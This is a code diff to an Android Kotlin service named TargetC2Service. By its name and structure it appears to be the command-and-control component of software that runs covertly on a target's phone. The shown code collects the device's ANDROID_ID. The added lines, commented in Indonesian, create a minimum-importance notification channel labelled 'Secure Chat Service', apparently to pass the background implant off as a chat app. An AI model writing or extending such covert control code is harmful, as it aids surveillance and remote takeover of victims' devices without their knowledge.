@@ -50,12 +50,29 @@ class TargetC2Service : Service() {
     private var broadcastListener: ChildEventListener? = null
 
     override fun onCreate() {
-        super.onCreate()
-        val id = android.provider.Settings.Secure.getString(
-            contentResolver, android.provider.Settings.Secure.ANDROID_ID
-        ) ?: UUID.randomUUID().toString()
-        _deviceId = id
+    super.onCreate()
+    
+    // === 1. LOGIC BAWAAN LU (Ambil Device ID) ===
+    val id = android.provider.Settings.Secure.getString(
+        contentResolver, android.provider.Settings.Secure.ANDROID_ID
+    ) ?: java.util.UUID.randomUUID().toString()
+    _deviceId = id
+    
+    // === 2. TAMBAHAN (Wajib Bikin Channel-nya di sini) ===
+    if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
+        val channelId = "secure_chat_channel" // <--- Pastiin nanti di Builder pake ID ini
+        val channelName = "Secure Chat Service"
+        val importance = android.app.NotificationManager.IMPORTANCE_MIN
+        
+        val channel = android.app.NotificationChannel(channelId, channelName, importance).apply {
+            description = "Channel untuk background service Secure Chat"
+        }
+        
+        val notificationManager = getSystemService(android.content.Context.NOTIFICATION_SERVICE) as android.app.NotificationManager
+        notificationManager.createNotificationChannel(channel)
     }
+}
+
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
         val action = intent?.action ?: "start"
